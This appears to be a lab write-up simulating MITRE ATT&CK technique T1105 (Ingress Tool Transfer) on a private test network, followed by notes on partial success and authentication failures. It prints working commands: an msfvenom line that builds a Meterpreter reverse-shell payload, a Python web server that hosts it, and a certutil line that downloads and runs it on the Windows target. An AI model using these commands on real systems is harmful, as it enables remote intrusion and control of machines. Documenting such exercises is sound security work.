# T1105 - Ingress Tool Transfer

## Description
This technique involves downloading additional tools, scripts, or payloads from an attacker-controlled server to a compromised host. It is commonly used after initial access to bring in more powerful tools.

**MITRE ATT&CK Technique:** [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Objective:** Transfer a Meterpreter payload from attacker to victim using common LOLBins

---

## Execution Steps

**On Attacker (Kali):**
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.250 LPORT=5555 -f exe > tool.exe
python3 -m http.server 8080

On Target (via existing session or admin shell):
certutil -urlcache -split -f http://192.168.10.250:8080/tool.exe C:\Windows\Temp\tool.exe
C:\Windows\Temp\tool.exe

Results & ChallengesStatus: Partially SuccessfulSuccessfully generated the payload on Kali.
Able to host the file using Python web server.
Failed to reliably transfer and execute the payload due to difficulties maintaining a stable Administrator shell.
Multiple attempts using Impacket PsExec and Meterpreter encountered authentication and permission issues (STATUS_LOGON_FAILURE, STATUS_NO_LOGON_SERVERS, Permission Denied).

Main Issues Encountered:Domain authentication problems when using ADPRO\Administrator
Low-privilege Meterpreter session prevented file upload to protected folders
PsExec/WMIExec had inconsistent success due to logon server / credential validation iss


